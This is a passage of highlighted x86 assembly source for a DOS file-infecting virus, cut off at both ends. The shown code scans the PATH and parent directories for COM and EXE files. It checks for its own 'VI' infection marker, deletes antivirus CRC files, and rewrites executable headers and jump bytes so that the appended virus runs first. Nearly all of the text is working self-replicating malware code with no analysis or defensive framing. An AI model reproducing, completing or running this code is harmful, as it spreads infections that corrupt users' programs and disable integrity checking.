     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'HT'</span><span class="sc0">                    </span><span class="sc1">;search the string 'PATH='</span><span class="sc0">
     </span><span class="sc6">scasw</span><span class="sc0">                          </span><span class="sc1">;in memory</span><span class="sc0">
     </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">yet</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'='</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">scasb</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">yet</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">





</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;main part of virus routine to search for files</span><span class="sc0">
</span><span class="sc1">;to infect.</span><span class="sc0">

</span><span class="sc5">pathdir</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">                  </span><span class="sc1">;go to search in current dir</span><span class="sc0">
</span><span class="sc5">again1</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">parent</span><span class="sc0">                    </span><span class="sc1">;no file found go to "parent"</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">                  </span><span class="sc1">;one file found infect it! </span><span class="sc0">
       
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">count_infect</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_infect</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">search_again</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">again1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">parent</span><span class="sc4">:</span><span class="sc0">    
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">up_dir</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">pathdir</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">change_to_c</span><span class="sc4">:</span><span class="sc0">        
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">change_path_dir</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pathdir</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_infect</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_dta</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">read_header</span><span class="sc4">:</span><span class="sc0">
         
            </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">test1</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc1">;is it really an exe?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">test3</span><span class="sc0">
</span><span class="sc5">test2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc1">;idem</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">its_a_com</span><span class="sc0">
</span><span class="sc5">test3</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'VI'</span><span class="sc1">;infected?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">terminer</span><span class="sc0">                          </span><span class="sc1">;yes,bye bye</span><span class="sc0">

</span><span class="sc5">test3b</span><span class="sc4">:</span><span class="sc0"> 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">00c6h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">test4</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">00b7h</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">terminer</span><span class="sc0"> 
</span><span class="sc5">test4</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;overlay=0?</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">terminer</span><span class="sc0">                         </span><span class="sc1">;not,bye bye</span><span class="sc0">
</span><span class="sc5">test5</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">;windows exe?  </span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">terminer</span><span class="sc0">                          </span><span class="sc1">;yes ,adios :(</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_target</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_attributes</span><span class="sc0">
</span><span class="sc5">its_a_com</span><span class="sc4">:</span><span class="sc0">   

</span><span class="sc5">test_com</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'V'</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">terminer</span><span class="sc0">
</span><span class="sc5">test_win</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0e1fh</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_win_com</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0e807h</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">terminer</span><span class="sc0">

 </span><span class="sc5">not_win_com</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suit</span><span class="sc0">
             </span><span class="sc5">end_infect</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_infect2</span><span class="sc0">
             </span><span class="sc5">suit</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_target</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">store_bytes</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
             </span><span class="sc6">movsw</span><span class="sc0">
             </span><span class="sc6">movsw</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">get_attributes</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
                 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_dta</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                 </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">attribute</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">set_attributes</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_dta</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_attrib</span><span class="sc0">
</span><span class="sc5">kill_crc_files</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------</span><span class="sc0">
</span><span class="sc1">;delete crc files</span><span class="sc0">

                 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">killfile1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_attrib</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">kill_file</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">
 </span><span class="sc5">terminer</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
 </span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0"> 
                 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">killfile2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_attrib</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">kill_file</span><span class="sc0">

                 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">killfile3</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_attrib</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">kill_file</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">

 
</span><span class="sc5">get_time_date</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
                 </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_target</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">go_end_of_file</span><span class="sc0">
</span><span class="sc5">store_info_header</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">store_ss</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">   
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">store_sp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">store_ip</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">store_cs</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         
</span><span class="sc5">go_end_of_file</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go_end</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_target</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_exe_infect</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">queue</span><span class="sc4">+(</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">queue</span><span class="sc4">+(</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go_end</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jmp_bytes</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">change_patch</span><span class="sc0">

 </span><span class="sc5">next_exe_infect</span><span class="sc4">:</span><span class="sc0">     

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">compute_new_csip</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                  </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
                  </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> 
</span><span class="sc5">change_header</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">0FF0h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc2">00FFh</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'VI'</span><span class="sc0">
</span><span class="sc5">change_patch</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">begin_main</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">patch2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">_ret</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ret_addr</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                 
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">begin_2nd</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">patch</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_target</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                  </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">write_virus</span><span class="sc0">   
